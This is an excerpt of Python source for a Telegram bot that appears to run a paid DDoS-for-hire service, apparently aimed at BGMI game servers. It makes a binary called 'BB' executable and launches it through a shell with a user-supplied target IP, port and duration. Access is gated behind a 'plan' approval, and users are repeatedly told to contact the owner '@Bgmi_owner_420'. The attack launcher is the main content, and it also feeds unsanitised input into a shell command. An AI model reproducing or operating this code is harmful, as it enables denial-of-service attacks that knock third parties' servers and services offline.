...
try:
    ...
    os.chmod(BB_path, 0o755)  # 755 grants execute permissions for all users

    print(f"Execute permission granted for {BB_path}.")
...
FORWARD_CHANNEL_ID = -1002461787556
CHANNEL_ID = -1002461787556
error_channel_id = -1002461787556
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./BB {target_ip} {target_port} {duration}")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @Bgmi_owner_420.*", parse_mode='Markdown')  # Contact owner message
            return
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @Bgmi_owner_420* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @Bgmi_owner_420* 🙏"  # Contact owner message
    else:
